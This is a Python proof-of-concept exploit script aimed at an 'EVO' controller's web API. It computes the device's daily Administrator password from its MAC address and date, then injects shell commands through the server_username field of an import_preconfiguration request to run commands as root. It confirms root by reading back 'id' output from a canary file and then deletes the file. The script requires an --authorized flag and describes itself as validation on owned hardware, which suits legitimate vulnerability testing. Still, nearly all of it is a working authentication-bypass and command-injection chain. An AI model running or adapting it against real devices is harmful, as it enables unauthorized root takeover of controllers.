#!/usr/bin/env python3
import argparse
import hashlib
import json
import re
import ssl
from pathlib import Path
from urllib.error import HTTPError
from urllib.parse import urlencode
from urllib.request import urlopen

from xweb_evo_password import password
from xweb_evo_ssh_chain import controller_time, request_json


def request_bytes(url, values, timeout):
    with urlopen(url, data=urlencode(values).encode(), timeout=timeout, context=ssl._create_unverified_context()) as response:
        return response.read()


def api_action(base, action, values, timeout):
    values = dict(values)
    values["action"] = action
    try:
        return request_json(base + "/cgi-bin/api.lua", values, timeout)
    except HTTPError as error:
        if error.code == 500:
            return {"status": "error", "http": 500}
        raise


def inject(base, token, command, timeout):
    username = f'x:y"; {command}; #'
    return api_action(
        base,
        "import_preconfiguration",
        {
            "auth": token,
            "server_url": "http://192.0.2.1/x",
            "server_username": username,
        },
        timeout,
    )


def main():
    parser = argparse.ArgumentParser(description="Validate the EVO Administrator command-injection chain on an owned controller.")
    parser.add_argument("target", help="Controller base URL, for example https://192.0.2.10")
    parser.add_argument("--authorized", action="store_true", help="Confirm ownership and permission to create a canary")
    parser.add_argument("--timeout", type=float, default=5)
    parser.add_argument("--daily-code", help=argparse.SUPPRESS)
    parser.add_argument("--keep-canary", action="store_true")
    parser.add_argument("--json", type=Path, help="Optional sanitized result log; no credentials or tokens are recorded")
    args = parser.parse_args()
    if not args.authorized:
        parser.error("--authorized is required; use only on a device you own and may modify")
    base = args.target.rstrip("/")
    if not re.match(r"^https?://[^/]+$", base):
        parser.error("target must be an HTTP(S) base URL without a path")

    token = None
    injected = False
    result = {"target": base, "validated": False, "canary_removed": False}
    canary = "/opt/setup/templates/evo-rce"
    try:
        system = request_json(base + "/cgi-bin/sysinfo.lua", timeout=args.timeout)
        info = system.get("info", system)
        mac = re.sub(r"[^0-9A-Fa-f]", "", str(info["id"])).upper()
        if len(mac) != 12:
            raise ValueError("sysinfo did not return a valid MAC address")
        now = controller_time(info)
        daily = args.daily_code or password(now.day, now.month, now.year % 100, mac)
        result.update({"release": info.get("release"), "date": now.date().isoformat()})

        authentication = api_action(
            base,
            "authenticate",
            {"username": "Administrator", "password": daily},
            args.timeout,
        )
        if authentication.get("status") != "ok":
            raise RuntimeError(f"Administrator authentication failed: {authentication}")
        token = authentication["auth"]

        injected = True
        result["injection"] = inject(base, token, f"id > {canary}", args.timeout)
        filename = hashlib.md5(b"evo-rce").hexdigest()
        proof = request_bytes(
            base + "/cgi-bin/utility.lua",
            {
                "action": "download",
                "SSES": token,
                "location": "templates",
                "filename": filename,
            },
            args.timeout,
        ).decode("utf-8", errors="replace").strip()
        result["proof"] = proof
        result["validated"] = "uid=0" in proof
        if not result["validated"]:
            raise RuntimeError(f"Command output did not contain uid=0: {proof[:200]}")
    finally:
        if injected and not args.keep_canary:
            try:
                result["cleanup"] = inject(base, token, f"rm -f {canary}", args.timeout)
                result["canary_removed"] = True
            except Exception as error:
                result["cleanup_error"] = str(error)
    print(json.dumps(result, indent=2))
    if args.json:
        args.json.parent.mkdir(parents=True, exist_ok=True)
        args.json.write_text(json.dumps(result, indent=2) + "\n")


if __name__ == "__main__":
    main()
